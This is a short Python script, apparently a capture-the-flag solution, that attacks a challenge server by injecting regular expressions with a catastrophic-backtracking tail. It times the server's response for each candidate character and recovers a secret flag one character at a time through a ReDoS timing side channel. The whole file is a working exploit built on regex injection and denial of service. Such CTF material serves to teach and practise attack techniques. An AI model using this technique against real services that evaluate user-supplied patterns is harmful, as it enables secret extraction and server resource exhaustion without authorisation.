import asyncio
import aiohttp
import re

url = 'http://matchmaker-1.play.hfsc.tf:12345/'
param_prefix = '^(?=^midnight{'

async def get_response(char):
    end = ")((.*)*)*salt$"
    param_value = f"{param_prefix}{char}{end}"
    full_url = f"{url}?x={param_value}"
    async with aiohttp.ClientSession() as session:
        async with session.get(full_url) as response:
            string = await response.text()
            match = re.search(r'Exec Time:</strong> ([\d\.E-]+)<br />', string)
            if match:
                exec_time = float(match.group(1))
                return (char, exec_time)

async def main():
    tasks = []
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&()_+-=}":
        tasks.append(asyncio.ensure_future(get_response(char)))
    responses = await asyncio.gather(*tasks)
    highest_exec_time = max(responses, key=lambda x: x[1])
    highest_exec_time_char = highest_exec_time[0]
    print(f"Highest exec_time: {highest_exec_time[1]} for character: {highest_exec_time_char}")
    global param_prefix
    param_prefix += highest_exec_time_char
    print(param_prefix)
    if highest_exec_time_char != '}':
        await main()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    print(f"Param Prefix: {param_prefix}")
